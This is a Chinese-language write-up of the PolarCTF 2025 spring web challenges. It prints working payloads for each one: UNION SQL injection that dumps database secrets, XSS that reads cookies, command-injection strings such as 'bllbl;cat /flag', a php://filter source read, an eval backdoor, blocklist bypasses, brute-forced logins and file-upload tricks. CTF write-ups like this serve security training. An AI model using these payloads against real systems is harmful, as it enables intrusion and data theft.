# PolarCTF 2025 春季个人赛 Web Writeup


PolarCTF 2025 Web Challenge Walkthrough

# code的登录


访问首页
![image-20250221181200747](file-20250322125933317.png)
点击登录，宝贝，一个廉价的登录框
![image-20250221181200747](file-20250322130314796.png)
点击 提示，宝贝；并查看网页源代码，得到账号名 `coke` 
![image-20250221181200747](file-20250322130124610.png)
访问 `result.php`，并没有该文件
![image-20250221181200747](file-20250322130219708.png)
查看首页源代码
![image-20250221181200747](file-20250322130420397.png)
页面加载同时也会去执行一次 cookies.php ，该文件会设置当前的 cookie
当前 cookie
![image-20250221181200747](file-20250322132108508.png)
访问 cookies.php
![[PolarCTF 2025春季个人挑战赛/file-20250322132037324.png]]
尝试用刚得到的cookie作为密码登录

```text
coke/coke-lishuai
```
![image-20250221181200747](file-20250322132147600.png)



# 再给我30元

![image-20250221181200747](file-20250323164433528.png)

查看网页源码
![image-20250221181200747](file-20250323164451878.png)

输入尝试，很明显的 SQL 注入
![image-20250221181200747](file-20250323164531895.png)

测试列数为2
```text
?id=1 group by 2
?id=1 group by 3
```
![image-20250221181200747](file-20250323165029577.png)

两个位置都能返回信息
```text
?id=-1 union select version(),database()
```
![image-20250221181200747](file-20250323165159580.png)

测库
```text
?id=-1 union select version(),(select group_concat(schema_name) from information_schema.schemata)
```
![image-20250221181200747](file-20250323165352749.png)

注表
```text
?id=-1 union select version(),(select group_concat(table_name) from information_schema.tables where table_schema=database())
```
![image-20250221181200747](file-20250323165548416.png)

注列
```text
?id=-1 union select version(),(select group_concat(column_name) from information_schema.columns where table_name=0x757365725f696e666f)
```
![image-20250221181200747](file-20250323170326421.png)

flag
```text
?id=-1 union select version(),(select group_concat(secret) from WelcomeSQL.user_info)
```
![image-20250221181200747](file-20250323170928299.png)



# 0e事件

访问
![image-20250221181200747](file-20250323171323050.png)

随意输入
![image-20250221181200747](file-20250323171900261.png)

官方解释是根据题意 0e ，得知是 md5碰撞，0e绕过，php 在处理 hash 的时候，会将每个 0e 的开头 hash 值解释为0，那么只要传入不同字符串经过 hash 以后，php 就会认为他们是相同的
```text
?a=s1502113478a
```
![image-20250221181200747](file-20250323172237739.png)
就得到了 flag ？？这玩脑洞的题目是真不喜欢...



# 来个弹窗

![image-20250221181200747](file-20250323172531322.png)

随意输入，输入的内容会回显在 html 中
![image-20250221181200747](file-20250323172843312.png)

查看源代码
![image-20250221181200747](file-20250323172914820.png)

把 `<p>` 标签闭合
```text
</p>123
```
![image-20250221181200747](file-20250323173024578.png)

看哪个 Payload 顺眼放进去就好了
```text
</p>onfocus=javascript:alert()
```
![image-20250221181200747](file-20250323173107046.png)

这还考动漫人物名 awa
![image-20250221181200747](file-20250323173314581.png)

Google 一下，白金之星
![image-20250221181200747](file-20250323173617828.png)

```text
flag{dbd65172f0a14c279bc461cd0185c70a}
```


# bllbl_rce

![image-20250221181200747](file-20250323174448497.png)

输入命令，不管怎么试都是 no
![image-20250221181200747](file-20250323174516200.png)

扫描目录，发现了网站源码备份
![image-20250221181200747](file-20250323175043140.png)
![image-20250221181200747](file-20250323175058041.png)

![image-20250221181200747](file-20250323175309089.png)
```php
<?php
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    if (strpos($command, 'bllbl') === false) {
        die("no");
    }
    echo "<pre>";
    system ($command);
    echo "</pre>";
}
?>
```

检查 `command` 中是否包含子串 `bllbl` ，没有退出程序，有则把输入交给 `system` 执行命令

```text
bllbl;ls /
```
![image-20250221181200747](file-20250323174820199.png)

```text
bllbl;cat /flag
```
![image-20250221181200747](file-20250323174945247.png)


# 复读机RCE 

![image-20250221181200747](file-20250323190725037.png)

随意输入
![image-20250221181200747](file-20250323190736850.png)

目录扫描
![image-20250221181200747](file-20250323190750724.png)

访问就拿到 flag
![image-20250221181200747](file-20250323190804264.png)



# 狗黑子CTF变强之路

![image-20250221181200747](file-20250323190939296.png)
随意点击，发现文件包含
![image-20250221181200747](file-20250323191958291.png)

包含 `/etc/passwd` ，被告知只允许包含 php 文件
![image-20250221181200747](file-20250323192021350.png)包含 `index.php` 

```text
index.php?page=php://filter/convert.base64-encode/resource=index.php
```
![image-20250221181200747](file-20250323192728739.png)
```php
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    // 简单的文件类型检查，只允许包含 php 文件
    if (strpos($page, '.php')!== false) {
        include($page);
    } else {
        echo "只允许包含 php 文件";
    }
}
?>
...
    <?php
    if (isset($_GET['page'])) {
        echo '<div id="display">';
    }
 ?>
</body>
</html>
<?php @eval($_POST['cmd'])?>
```

`index.php` 页面就有 eval 后门，直接拿到 flag
![image-20250221181200747](file-20250323192917335.png)

同时开启的目录扫描中扫到 `admin.php`
![image-20250221181200747](file-20250323192211181.png)
![image-20250221181200747](file-20250323192415847.png)

读取 admin.php 源码
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 硬编码的用户名和密码
    $correctUsername = "ggouheizi";
    $correctPassword = "zigouhei";

    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username == $correctUsername && $password == $correctPassword) {
        // 登录成功，直接跳转到 gougougou.php
        header("Location: gougougou.php");
        exit;
    } else {
        $errorMessage = "用户名或密码错误，请重新输入。";
    }
}
?>
...
<body>
  <form method="post">
    <label for="username">用户名：</label><br>
    <input type="text" name="username"><br>
    <label for="password">密码：</label><br>
    <input type="password" name="password"><br><br>
    <input type="submit" value="登录">
    <?php if(isset($errorMessage)) { echo $errorMessage; }?>
  </form>
</body>

</html>
```

`gougougou.php` 页面一片空白，看来题目就是指定读 `index.php` 的思路拿 flag
![image-20250221181200747](file-20250323193040320.png)



# 椰子树晕淡水鱼

![image-20250221181200747](file-20250323193333919.png)

目录扫描
![image-20250221181200747](file-20250323193551205.png)

`admin.php`
![image-20250221181200747](file-20250323193611168.png)

`password` 文件解压需要密码
![image-20250221181200747](file-20250323194539451.png)

暴力破解，密码 0606
![image-20250221181200747](file-20250323195058568.png)

是一个字典
![image-20250221181200747](file-20250323195143096.png)

字典交叉爆破，得出账号密码
```text
zhsh/zhsh920
```
![image-20250221181200747](file-20250323210516331.png)

文件上传
![image-20250221181200747](file-20250324101604272.png)

MIMI类型改一下就成功了
![image-20250221181200747](file-20250324101530425.png)


![image-20250221181200747](file-20250324101648356.png)



# background

访问靶机
![image-20250221181200747](file-20250324102551626.png)

看看 js 文件
![image-20250221181200747](file-20250324102638950.png)

![image-20250221181200747](file-20250324102720986.png)

源码如下，JS 功能重点是向 `change_background.php` 发送一个 POST 请求，参数为 `d=echo&p=I will do it` 
```text
document.getElementById("change-bg-btn").onclick = function() {
    fetch("change_background.php", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            d: "echo",
            p: "I will do it！"
        })
    })
    .then(response => response.text())
    .then(text => {
        const lines = text.split('\n');
        const background = lines[0];     // 第一行是背景图路径
        const message = lines.slice(1).join('\n');  // 其余是输出信息

        document.body.style.backgroundImage = `url(${background})`;
        document.getElementById("result").innerText = message;
```

向 `change_background.php` 发送请求，页面返回了 `I will do it` ，猜测是程序进行了命令执行，源码可能为 `system($_POST['d'] . ' ' . $_POST['p']);`  这样类似的形式
```text
/change_background.php

POST:
d=echo&p=I will do it
```
![image-20250221181200747](file-20250324102948572.png)

```text
d=ls&p=/
```
`ls /` 命令执行成功
![image-20250221181200747](file-20250324110559575.png)

读取 flag
![image-20250221181200747](file-20250324110656049.png)



# xCsMsD

访问靶机
![image-20250221181200747](file-20250324110828204.png)

注册并登录
![image-20250221181200747](file-20250324110937804.png)

一个命令执行窗口，输入 `ls` 回显了执行结果
```text
index.php
styles.css
users.txt
xss_cmd.php
```
![image-20250221181200747](file-20250324111148046.png)

但后续无论怎么读，都失败了，除了禁止，也有没有回显结果的情况，比较奇怪
![image-20250221181200747](file-20250324111454494.png)

回到 XSS 窗口，尝试一下 XSS
![image-20250221181200747](file-20250324110953681.png)

```text
"><script>alert()</script><"
```
![image-20250221181200747](file-20250324114727363.png)

弹 Cookie
```text
"><script>alert()</script><"<script>alert(document.cookie)</script>
```
![image-20250221181200747](file-20250324114802803.png)

是一段 URL 编码，解密发现好像是一个提示？
```text
%27+%27-%3E%27-%27%2C+%27%5C%27-%3E%27%2F%27
' '->'-', '\'->'/'
```

```text
rev-xss_cmd.php
```
成功执行命令
![image-20250221181200747](file-20250324120945773.png)

对输出内容进行反转，其中是将空格替换为 `-`，替换 `\`为`/` 
```php
<?php
setcookie('cookie', "' '->'-', '\'->'/'", time() + (10 * 365 * 24 * 60 * 60), "/"); // 10年有效期
?>
<?php
if (isset($_POST['execute_command'])) {
	// 获取用户输入
	$command = $_POST['command_input'];
	// 替换空格为空
	$command = str_replace(' ', '', $command);
	// 替换 "/" 为空
	$command = str_replace('/', '', $command);
	// 替换 "-" 为空格
	$command = str_replace('-', ' ', $command);
	// 替换 "\" 为 "/"
	$command = str_replace('\\', '/', $command);
	// 过滤掉一些常见的命令行读取文件的函数
	$forbidden_commands = ['cat', 'less', 'more', 'head', 'tail', 'nl', 'strings', 'awk', 'sed', 'dd', 'xxd'];
	// 检查输入的命令是否包含被禁止的关键字
	foreach ($forbidden_commands as $forbidden) {
		if (preg_match("/\b$forbidden\b/i", $command)) {
			die("禁止使用此命令: $forbidden");
		}
	}
	// 对命令进行转义以增强安全性
	$command = escapeshellcmd($command);
	// 执行命令并显示输出
	$output = shell_exec($command);
	echo "<pre>$output</pre>";
}
?>
```

拿到 flag
```text
rev-\flag
```
![image-20250221181200747](file-20250324120341117.png)



# 小白说收集很重要

![image-20250221181200747](file-20250324151536705.png)


![image-20250221181200747](file-20250324151555548.png)

`/users.json`
![image-20250221181200747](file-20250324151645621.png)

爆破
![image-20250221181200747](file-20250324154000073.png)

登录
```text
admin01/admin
```
提示寻找管理员账号密码登录界面
![image-20250221181200747](file-20250324154215535.png)

后面一直尝试爆破，用户名换了很多，密码使用登录后的社工密码生成也生成了许多，但爆破成功的登录进去都是普通用户，实在没有进展，于是切换思路尝试越权
现在是 `/user_dashboard.php`
![image-20250221181200747](file-20250324154434672.png)
要到管理员界面，先尝试直接切换 URL

```text
/admin_dashboard.php
```
直接成功，获取 Flag
![image-20250221181200747](file-20250324154550278.png)
![image-20250221181200747](file-20250324154643897.png)

看了官方WP，这题还有另外一个思路，就是通过爆破拿到管理员账号密码
社工密码生成，填入一些赛方关键词，生成密码
```text
xiaobai,admin
```
![image-20250221181200747](file-20250324154821782.png)

账号名选用一些常用弱口令账号，爆破
![image-20250221181200747](file-20250324155348878.png)
这样也有机会碰进管理员界面




# 投喂2.0

![image-20250221181200747](file-20250324155525438.png)

.htaccess 能传，图片也能传，就是不生效，试了很久
![image-20250221181200747](file-20250324160449946.png)

后面尝试 apache 解析漏洞
![image-20250221181200747](file-20250324165853696.png)

执行成功
![image-20250221181200747](file-20250324170057507.png)


---

> Author: [L1nq](https://github.com/L1nq0)  
> URL: https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/  

